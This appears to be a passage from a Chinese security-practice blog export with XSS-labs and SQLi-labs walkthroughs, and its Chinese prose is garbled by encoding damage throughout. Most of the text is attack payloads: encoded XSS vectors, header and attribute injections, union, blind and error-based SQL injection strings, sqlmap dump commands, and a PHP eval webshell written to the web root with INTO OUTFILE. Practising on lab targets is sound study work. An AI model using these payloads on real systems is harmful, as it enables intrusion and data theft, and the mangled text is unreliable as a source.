è¿™é“é¢˜è¿‡æ»¤æœ‰ç‚¹å¯¹ï¼ŒæŸ¥çœ‹æºç  1234567891011ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);#å¤§å°å†™è¿‡æ»¤$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt; #è¿˜æœ‰htmlç¼–ç  æ–¹æ³•ä¸€ï¼šhtml å®ä½“ç¼–ç :java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) æ–¹æ³•äºŒï¼šfromCharCode()å‡½æ•°:String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 49, 41, 60, 47, 115, 99, 114, 105, 112, 116, 62) 9. é€šè¿‡è¯•æ¢ï¼Œè¿™ä¸€å…³ä¸ä¸Šä¸€å…³ä¸åŒçš„æ˜¯ä¼šåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šï¼ŒåŠ å…¥åœ°å€çš„æ£€æŸ¥ï¼Œé¦–å…ˆåˆ¤æ–­ä¼šæ£€æŸ¥å“ªäº›å†…å®¹ï¼Œè¿™ä¸€å…³ä¼šæ£€æŸ¥è¾“å…¥çš„æ•°æ®ä¸­æ˜¯å¦ä¼šæœ‰ httpï¼š//å­—æ®µï¼Œæ‰€ä»¥éœ€è¦åœ¨è¾“å…¥çš„å­—æ®µä¸­åŠ å…¥è¯¥å­—æ®µ 12345678f(false===strpos($str7,&#x27;http://&#x27;))&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;;&#125; payload:java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&#39;http://&#39;) 10.hidden å±æ€§å€¼â€”éšè—æ— æ³•è§¦å‘äº‹ä»¶ è¿™ä¸€æ²¡æœ‰è¾“å…¥çš„åœ°æ–¹ï¼Œéœ€è¦åœ¨ url åœ°å€æ ä¸­è¾“å…¥ï¼Œè¿™ä¸€æ—¶è¾“å…¥æ˜¯éšè—çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ keyname å¹¶ä¸æ˜¯è¦æ³¨å…¥çš„åœ°æ–¹ï¼ŒçœŸæ­£æ³¨å…¥çš„åœ°æ–¹æ˜¯ä¸‰ä¸ª inputï¼Œä¸è¿‡è¿™ä¸‰ä¸ªè¢«éšè—äº†ï¼Œæ‰€ä»¥éœ€è¦å»è¯•æ¢è¿™ä¸‰ä¸ªå“ªä¸ªæ˜¯æ­£ç¡®çš„ï¼Œåªæœ‰ t_sort æ˜¯æ­£ç¡®çš„ è¿™é‡Œçš„å±æ€§å€¼æ˜¯å¯ä»¥è¢«æ›¿ä»£çš„ï¼Œé€šè¿‡å†æ¬¡type=&quot;text&quot;æ¥é‡æ–°è®¾ç½®å±æ€§å€¼ï¼Œç„¶åæ·»åŠ äº‹ä»¶ï¼Œå³å¯è§¦å‘å¼¹æ¡† payload:t_sort=&quot;2 type=&quot;text&quot; onclick=&quot;alert(1) åˆ©ç”¨ html çš„ accesskey å±æ€§t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot; 11.referer æ³¨å…¥ æºç ï¼Œï¼Œ(ä¸çœ‹æºç çš„è¯ã€‚ã€‚ã€‚æ²¡äº†å‘€) 1234567891011$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt; å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå¯¹ referer å‚æ•°æ›¿æ¢äº†&lt;&gt;,æ²¡æœ‰äº†å…¶ä»–è¿‡æ»¤ï¼Œå¯¹äº t_sort è¿›è¡Œäº† HTML å®ä½“åŒ–ï¼Œè€Œä¸”æ˜¯åŒå¼•å·é—­åˆï¼Œæ‰€ä»¥ä¸ä¼šæœ‰æ³¨å…¥ã€‚referer çš„ payload:åœ¨ hackbar ä¸­ä¼  referer å‚æ•°t_ref=2&quot; onclick=&quot;alert(1)&quot; type=&quot;text 12.User-agent çš„ xss æ³¨å…¥ å’Œ 11 é¢˜çš„åŸç†ä¸€æ · 13.cookie çš„ xss æ³¨å…¥ å’Œä¸Šè¿°å·®ä¸å¤š 14.è¿™é“é¢˜æœ‰é—®é¢˜15.ng-include æºç  12345&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;?&gt; å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œå˜é‡åæ˜¯â€œsrcâ€ï¼Œè¿™ä¹Ÿæ²¡æœ‰æç¤ºï¼Œç¡®å®çŒœä¸åˆ°é€šè¿‡è¯•æ¢ï¼Œå‘ç°æ‰€æœ‰çš„è¾“å…¥éƒ½ä¼šè¢«æ³¨è§†åˆ° ngInclude: 1 ä¹‹åï¼Œæ‰€ä»¥å…ˆäº†è§£ä¸€ä¸‹ ngInclude å®ƒçš„ä½œç”¨ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ª html é¡µé¢å‘ç°åœ¨è¯¥é¡µé¢ä¼šåŠ è½½ level1 çš„é¡µé¢ï¼Œæˆ‘ä»¬åœ¨ 15 é¡µé¢é‡Œé¢æ˜¯æ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯åœ¨ 1 é¡µé¢é‡Œé¢æœ‰ï¼Œå°è¯•åœ¨ 1 é‡Œé¢æ³¨å…¥src=&#39;level1.php?name=1&lt;script&gt;alert(1)&lt;/script&gt;&#39;å¹¶æ²¡æœ‰è¢«æ‰§è¡Œï¼Œå› ä¸ºé€šè¿‡ htmlspecialchars($str)å‡½æ•°ï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦è¢«è½¬ç äº†ï¼Œè½¬ä¸ºäº† html å®ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨å…¶ä»–æ ‡ç­¾çš„äº‹ä»¶å±æ€§è§¦å‘src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39; 16. ç›´æ¥åœ¨å‰ç«¯é¡µé¢ä¸­ä¿®æ”¹ img æ ‡ç­¾å³å¯ã€‚ã€‚ æºç åªæ˜¯è¿‡æ»¤äº†éƒ¨åˆ†å­—ç¬¦ï¼Œpayload&lt;img%0asrc=1%0aonerror=alert(1)&gt; 17-18-19-20â€“ å››é“é¢˜éƒ½ä¸€ç±»é¢˜ï¼Œæ¶‰åŠ flash-xssï¼Œswfåç¼€æ–‡ä»¶â€“åŠ¨ç”»è½¯ä»¶ Flash çš„ä¸“ç”¨æ ¼å¼ï¼Œå¹¿æ³›åº”ç”¨äºç½‘é¡µè®¾è®¡å’ŒåŠ¨ç”»åˆ¶ä½œéƒ¨åˆ†æºç å¦‚ä¸‹ 1234&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt; embed çš„è¯­æ³•æ ¼å¼ï¼š&lt;embed å±æ€§ 1=â€œå±æ€§å€¼ 1â€ å±æ€§ 2=â€œå±æ€§å€¼ 2â€â€¦â€¦&gt;payload:?arg01=a&quot; onmouseover=alert(1)&amp;arg02=bä½†æ˜¯æ²¡ååº”ï¼Œä¸æ‡‚äº†ã€‚ã€‚ã€‚","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"}]},{"title":"sql_labs","slug":"sql-labs/PAGE-1(Basic Challenges)","date":"2021-03-24T12:50:43.000Z","updated":"2021-04-23T15:43:50.377Z","comments":true,"path":"2021/03/24/sql-labs/PAGE-1(Basic Challenges)/","link":"","permalink":"http://example.com/2021/03/24/sql-labs/PAGE-1(Basic%20Challenges)/","excerpt":"","text":"å…ˆä¸Šå›¾ PAGE-1(Basic Challenges)ä¸€ã€GET ç¯‡1.2 æœ€åŸºæœ¬æ–¹æ³• åˆ¤æ–­æ³¨å…¥ç±»å‹http://127.0.0.1/sqli-labs/Less-1/?id=1æ­£ç¡®è¿”å›http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;å‡ºç°æŠ¥é”™æ˜¾ç¤ºhttp://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=1--+åˆ¤æ–­å­—ç¬¦å‹å’Œæ•°å­—å‹æ³¨å…¥çš„æ–¹æ³•è¿™é“é¢˜æ„Ÿè§‰å¥½åƒå­—ç¬¦å‹å¯ä»¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤šæ˜¯å­—ç¬¦å‹æ³¨å…¥ çŒœæµ‹å­—æ®µæ•° 1234http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 1--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 2--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 3--+http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;order by 4--+ å­—æ®µæ•°ä¸º 4 çš„æ—¶å€™ï¼Œå‡ºç°æŠ¥é”™Unknown column &#39;4&#39; in &#39;order clause&#39;æ‰€ä»¥å­—æ®µæ•°ä¸º 3 3. ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåºå› ä¸º sql è¯­å¥çš„æ‰§è¡Œç»“æœåªæœ‰ç¬¬ä¸€è¡Œä¼šè¢«å›æ˜¾åœ¨é¡µé¢ä¸Šï¼Œæ‰€ä»¥è®°ä½è¦æŠŠå‰é¢çš„å€¼å®šä¸ºç©ºï¼Œå°±ä¼šæ²¡æœ‰æ˜¾ç¤ºï¼Œè¿™æ ·unionçš„è¯­å¥çš„ç»“æœæ‰èƒ½æ˜¾ç¤ºå‡ºæ¥http://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,3 --+å¦‚å›¾ 1.1 æ‰€ç¤ºå¯ä»¥çœ‹åˆ°ï¼Œ2ï¼Œ3ï¼Œå›æ˜¾æˆåŠŸï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ­¤å¤„æ³¨å…¥ 4. è·å–å½“å‰æ•°æ®åº“http://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,database(),version()--+è·å–å½“å‰æ•°æ®åº“å’Œæ•°æ®åº“ç‰ˆæœ¬é€šè¿‡å†…åµŒ sql æŸ¥è¯¢è¯­å¥å¾—åˆ°æ‰€æœ‰æ•°æ®åº“ï¼šhttp://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+å¦‚å›¾ 1.2 æ‰€ç¤º 5. è·å–æ•°æ®åº“è¡¨åhttp://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) --+ 6. è·å–è¡¨ä¸­çš„å­—æ®µåhttp://127.0.0.1/sqli-labs/Less-1/?id=&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) --+ 3-4. ä¸åŒäº 1 å’Œ 2 çš„&#39;ï¼Œè¿™æ˜¯åˆ†åˆ«é‡‡ç”¨æ˜¯&#39;)å’Œ&quot;)é—­åˆã€‚ã€‚ã€‚ 123456789$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);if($row)&#123; echo &#39;Your Login name:&#39;. $row[&#39;username&#39;]; echo &#39;Your Password:&#39; .$row[&#39;password&#39;];&#125;else&#123; print_r(mysql_error());&#125; 5.åŒæ³¨å…¥ï¼ŒåŸºäºå•å¼•å·çš„å­—ç¬¦å‹æ³¨å…¥(æŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”æ³¨å…¥ï¼Œæ—¶é—´å»¶è¿Ÿæ³¨å…¥)çœ‹åˆ°å›¾ï¼Œè¿˜æ˜¯æœ‰ç‚¹æ‡µ ğŸ˜³,you are in.....æ²¡æƒ³åˆ°ï¼Œè¿™é‡Œç›´æ¥å¯ä»¥ä½¿ç”¨ sqlmapï¼Œä¸€æŠŠæ¢­å“ˆã€‚ã€‚ã€‚sqlmap çœŸæ˜¯å¼ºå•Šï¼ 1234sqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --current-dbsqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 -D security --tablessqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 -D security -T users --columnssqlmap -u 127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 -D security -T users -C id,password --dump åŒæ³¨å…¥/äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥ï¼šä¸€ä¸ª select è¯­å¥åµŒå¥—å¦ä¸€ä¸ª select è¯­å¥ï¼Œé‡Œé¢çš„ select è¯­å¥å…ˆæ‰§è¡Œå†æ‰§è¡Œå¤–è¾¹çš„ select è¯­å¥ã€‚ concat()ï¼šè¿æ¥ä¸¤ä¸ªè¯­å¥ rand()ï¼šéšæœºè¾“å‡ºä¸€ä¸ªå°äº1çš„å°æ•° floor()ï¼šå‘ä¸‹å–æ•´ group by()ï¼šæŠŠç»“æœåˆ†ç»„è¾“å‡º count()ï¼šæ±‡æ€»æ•°æ®å‡½æ•° æ‰‹å·¥æ—¶é—´å»¶è¿Ÿå‹æ³¨å…¥http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and sleep(5)--+å»¶è¿Ÿå›æ˜¾åŠ è½½æˆåŠŸ_ çˆ†æ•°æ®åº“åé•¿åº¦?id=1&#39; and if(length(database())=8,sleep(5),1)--+_ çˆ†æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ¯id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+_ çˆ†æ•°æ®åº“åçš„ç¬¬äºŒä¸ªå­—æ¯id=1&#39; and if(left(database(),2)=&#39;se&#39;,sleep(5),1) --+ä¾æ¬¡ç±»æ¨ï¼Œå¾—å‡ºæ•°æ®åº“åä¸ºsecurity_ çˆ†è¡¨åid=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;u&#39;,sleep(5),1) --+,ä¾æ¬¡ç±»æ¨ï¼Œçˆ†å‡ºè¡¨åçš„æ‰€æœ‰å­—æ¯ &gt; limit çš„ä¾‹å­â€”æŸ¥è¯¢ 8 æ¡æ•°æ®ï¼Œç´¢å¼•ä» 5 åˆ° 12ï¼Œç¬¬ 6 æ¡è®°å½•åˆ°ç¬¬ 13 æ¡è®°å½•select _ from t_user limit 5,8;_ çˆ†å­—æ®µ?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; ,sleep(5),1)--+ * æŸ¥çœ‹å¯¹åº”å­—æ®µå†…å®¹?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+é€šè¿‡ id è¿›è¡Œæ’åº å¸ƒå°”å‹æ³¨å…¥æ­£ç¡®ä¼šå›æ˜¾ï¼Œé”™è¯¯æ²¡æœ‰å›æ˜¾:è‹¥æ•°æ®åº“çš„æœå­—æ¯å°äº tï¼Œåˆ™æœ‰å›æ˜¾ï¼Œåä¹‹ï¼Œåˆ™æ²¡æœ‰å›æ˜¾id=1&#39; and left((select database()),1)&lt;&#39;t&#39;--+ * æ¥ä¸‹é‡Œçš„æ­¥éª¤å’Œæ‰‹å·¥æ—¶é—´æ³¨å…¥å·®ä¸å¤šï¼Œåªæ˜¯å°‘äº†ä¸ª if åˆ¤æ–­è¯­å¥ æŠ¥é”™æ³¨å…¥ä¸»è¦å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼šé€šè¿‡ floor æŠ¥é”™ï¼Œé€šè¿‡ updatexml æŠ¥é”™ï¼Œexp æŠ¥é”™_ floor:and (select 1 from (select count(_),concat((payload),floor (rand(0)_2))x from information_schema.tables group by x)a) å…¶ä¸­payloadä¸ºä½ è¦æ’å…¥çš„SQLè¯­å¥ éœ€è¦æ³¨æ„çš„æ˜¯è¯¥è¯­å¥å°† è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º64ä¸ªå­—ç¬¦ æŸ¥è¯¢è¡¨å:id=1&#39; and (select 1 from (select count(_),concat((select table\\*name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor (rand(0)\\_2))x from information_schema.tables group by x)a)--+ updatexml:`and updatexml(1,payload,1)åŒæ ·è¯¥è¯­å¥å¯¹è¾“å‡ºçš„å­—ç¬¦é•¿åº¦ä¹Ÿåšäº†é™åˆ¶ï¼Œå…¶æœ€é•¿è¾“å‡º 32 ä½å¹¶ä¸”è¯¥è¯­å¥å¯¹ payload çš„åæ‚”ç±»å‹ä¹Ÿåšäº†é™åˆ¶ï¼Œåªæœ‰åœ¨ payload è¿”å›çš„ä¸æ˜¯ xml æ ¼å¼æ‰ä¼šç”Ÿæ•ˆ * exp 6. åŒæ³¨å…¥ï¼ŒåŸºäºåŒå¼•å·çš„å­—ç¬¦å‹æ³¨å…¥ ç›¸è¾ƒäº less-5ï¼Œè¿™é‡Œä½¿ç”¨äº†&quot;é—­åˆâ€¦. 7.å­—ç¬¦å‹æ³¨å…¥ï¼ŒåŸºäºå•å¼•å·å˜å½¢æ³¨å…¥ä¹‹å¯¼å…¥æ–‡ä»¶ å¯¼å…¥æ–‡ä»¶è¿™å—ï¼Œè¿˜æ˜¯å¾ˆé™Œç”Ÿã€‚ã€‚ id=1&#39;))--+æ­£å¸¸å›æ˜¾ï¼Œå¾—åˆ°é—­åˆæ–¹å¼ id=1&#39;)) order by 3å¾—åˆ°å­—æ®µæ•° å¯¼å…¥æ–‡ä»¶æ­¥éª¤ï¼š1.çŸ¥é“æ•°æ®åº“çš„è·¯å¾„ã€‚ã€‚2. è¾“å…¥id=-1&#39;)) union select &#39;&#39;,&#39;&#39;,3 into outfile &quot;/var/www/html/sqli-labs/1.txt&quot;--+ä½†æ˜¯æ­¤å¤„è¾“å…¥ sql è¯­å¥åï¼ŒæŠ¥é”™:æƒé™ä¸å…è®¸ã€‚ æ³¨æ„:mysql æ•°æ®åº“çš„é…ç½® secure_file_privï¼ˆè®¾ç½®é»˜è®¤ä¸º NULLï¼Œé™åˆ¶å¯¼å…¥å¯¼å‡ºï¼‰ mysql5.0.x ç‰ˆæœ¬ä»¥ä¸‹é»˜è®¤å¯å¯¼å‡ºå¯¼å…¥ã€‚ secure_file_priv è¦è®¾ç½®ä¸ºç©ºã€‚ã€‚ ç„¶è€Œè®¾ç½®æˆ‘ï¼Œæˆ‘è¿˜æ˜¯è¿˜æ˜¯æ²¡æœ‰æƒé™ è¿˜æ˜¯æ— æ³•å¯¼å‡ºã€‚ã€‚ã€‚ã€‚ æ­¤å¤„è¿˜å¯ä»¥å¯¼å‡ºä¸€å¥è¯æœ¨é©¬1â€™)) union select 1,2,&quot;&lt;?php @eval($_POST[value]);?&gt;&quot; into outfile &#39;/var/www/html/1.txt&#39;ä½†æ˜¯æˆ‘è¿˜æ²¡æœ‰å®ç°ã€‚ã€‚ã€‚ã€‚ã€‚ æ—¶é—´æ³¨å…¥ä¹Ÿæ˜¯å¯ä»¥å®ç°ã€‚ã€‚id=1&#39;)) and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+ å¸ƒå°”æ³¨å…¥ä¹Ÿæ˜¯å¯ä»¥å®ç°..id=1&#39;)) and left(database(),1)&gt;&#39;t&#39;--+ æŠ¥é”™æ³¨å…¥ä¹Ÿå¯ä»¥å®ç°ã€‚ã€‚1&#39;)) and (select 1 from (select count(*),concat((select version()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+ 8.ç›²æ³¨å…¥ï¼ŒåŸºäºå•å¼•å·çš„å­—ç¬¦å‹æ³¨å…¥ è¾“å…¥1&#39;,æ­£å¸¸æ˜¾ç¤ºï¼›1&#39;--+ï¼Œæ²¡æœ‰æ­£å¸¸å›æ˜¾ï¼Œä¹Ÿæ²¡æœ‰æŠ¥é”™æç¤ºï¼Œæ‰€ä»¥æ’é™¤æŠ¥é”™æ³¨å…¥ã€‚ã€‚ æ—¶é—´å»¶è¿Ÿæ³¨å…¥ çˆ†åº“å:id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+ çˆ†è¡¨å:id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1)=&#39;u&#39;,sleep(5),1)--+è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œmysql æ˜¾ç¤ºçš„æ•°æ®åº“è¡¨æ ¼ä¸­çš„æ•°æ®æ˜¯ä»ä¸‹å¾€ä¸Šæ•°çš„ã€‚ å¯èƒ½æ˜¯é¶æœºçš„é—®é¢˜ï¼Œåœ¨çˆ†å­—æ®µåçš„æ—¶å€™å‘ç”Ÿäº†é—®é¢˜ï¼Œå½“çˆ†ç¬¬äºŒä¸ªå­—æ®µåæ—¶ï¼Œpayload æ— æ•ˆ å¸ƒå°”æ³¨å…¥ çˆ†åº“å:left():id=1&#39; and left((select database()),1)=&#39;s&#39; --+ascii():id=1&#39; and ascii(substr(database(),1,1))=115--+ çˆ†è¡¨å:id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1)=&#39;u&#39;--+ascii()æ³•ä¹Ÿå¯ä»¥ã€‚ã€‚ã€‚ 9.ç›²æ³¨å…¥ï¼ŒåŸºäºå•å¼•å·çš„æ—¶é—´å»¶è¿Ÿæ³¨å…¥10.ç›²æ³¨ï¼ŒåŸºäºåŒå¼•å·çš„æ—¶é—´å»¶è¿Ÿæ³¨å…¥ å’Œä¸Šæ–‡ä¸­çš„æ—¶é—´å»¶è¿Ÿæ³¨å…¥å·®ä¸å¤šã€‚ã€‚ã€‚ äºŒã€POST ç¯‡11.åŸºäºå•å¼•å·çš„ POST æ³¨å…¥ æ–¹æ³•ä¸€:sqlmap ä¸€æŠŠæ¢­å“ˆ 12345step1ï¼šsqlmap -r [&quot;è¯·æ±‚å¤´æ–‡æœ¬&quot;] &#x2F;&#x2F;æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥step2ï¼šsqlmap -r [&quot;è¯·æ±‚å¤´æ–‡æœ¬&quot;] --current-db &#x2F;&#x2F;æŸ¥è¯¢å½“å‰æ•°æ®åº“step3ï¼šsqlmap -r [&quot;è¯·æ±‚å¤´æ–‡æœ¬&quot;] -D [&quot;æ•°æ®åº“å&quot;] --tables &#x2F;&#x2F;æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨step4ï¼šsqlmap -r [&quot;è¯·æ±‚å¤´æ–‡æœ¬&quot;] -D [&quot;æ•°æ®åº“å&quot;] -T [&quot;è¡¨å&quot;] --columns &#x2F;&#x2F;æŸ¥è¯¢æŒ‡å®šåº“æŒ‡å®šè¡¨çš„æ‰€æœ‰åˆ—step5ï¼šsqlmap -r [&quot;è¯·æ±‚å¤´æ–‡æœ¬&quot;] -D [&quot;æ•°æ®åº“å&quot;] -T [&quot;è¡¨å&quot;] -C [&quot;åˆ—å&quot;] --dump &#x2F;&#x2F;æ‰“å°å‡ºæŒ‡å®šåº“æŒ‡å®šè¡¨æŒ‡å®šåˆ—çš„æ‰€æœ‰å­—æ®µå†…å®¹ æ–¹æ³•äºŒï¼š=admin&#39;&amp;passwd=admin&amp;submit=Submit,å›æ˜¾æŠ¥é”™ã€‚=admin&#39;--+&amp;passwd=admin&amp;submit=Submit,ç™»é™†æˆåŠŸ_ åˆ¤æ–­å­—æ®µä¸ªæ•°:=admin&#39; order by 2--+&amp;passwd=admin&amp;submit=Submitå›æ˜¾æŠ¥é”™ã€‚æœ€å¤šä¸¤ä¸ªå­—æ®µ_ çˆ†æ•°æ®åº“:=-1&#39; union select version(),database()--+&amp;passwd=admin&amp;submit=Submit,å¾—åˆ°æ•°æ®åº“å’Œç‰ˆæœ¬çš„å›æ˜¾æ¥ä¸‹æ¥çš„æ­¥éª¤å°±å’Œä¸Šç¯‡çš„ get æ³¨å…¥æ–¹æ³•ä¸€è‡´äº†ã€‚ æ–¹æ³•ä¸‰:å› ä¸ºæœ‰æŠ¥é”™å›æ˜¾ï¼Œå…¶å®ä¹Ÿå¯ä»¥é€‰æ‹©é€šè¿‡æŠ¥é”™æ³¨å…¥ã€‚_ çˆ†åº“å:=1&#39;and (select 1 from (select count(_),concat((select database()),floor (rand(0)\\*2))x from information_schema.tables group by x)a)--+&amp;passwd=admin&amp;submit=Submit,ä¾ç„¶å›æ˜¾æ­£å¸¸ï¼Œå¾—åˆ°åº“åï¼Œæ¥ä¸‹æ¥çš„æ­¥éª¤å°±å’Œä¸Šç¯‡çš„ get æ³¨å…¥æ–¹æ³•ä¸€è‡´äº†ã€‚ 12.åŸºäºåŒå¼•å·åŠ å•æ‹¬å·&quot;)çš„ POST æ³¨å…¥ å’Œä¸Šæ–‡æåŠæ­¥éª¤ä¸€æ · 13.åŸºäº&#39;)çš„ POST ç›²æ³¨å…¥ é—­åˆåˆ¤æ–­ï¼Œé€šè¿‡order byåˆ¤æ–­å­—æ®µåï¼Œå›æ˜¾æŠ¥é”™ã€‚ã€‚=admin&#39;)--+&amp;passwd=admin&amp;submit=Submitç™»é™†æˆåŠŸåæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ union å…³é”®å­—æ³¨å…¥ï¼Œä½†æ˜¯ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥å­˜åœ¨æŠ¥é”™æ³¨å…¥ æŠ¥é”™:and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+&amp;passwd=admin&amp;submit=Submitçˆ†åº“æˆåŠŸã€‚ã€‚æ¥ä¸‹æ¥çš„æ­¥éª¤å°±ä¸èµ˜è¿°äº† æ—¶é—´æ³¨å…¥:=admin&#39;) and if((select database())=&#39;security&#39;,sleep(2),1)--+&amp;passwd=admin&amp;submit=Submit å¸ƒå°”æ³¨å…¥:=admin&#39;) and (select database())=&#39;security&#39;--+&amp;passwd=admin&amp;submit=Submit 14.åŸºäº&quot;çš„ POST æ³¨å…¥ å’Œ 13 é¢˜ä¸€æ 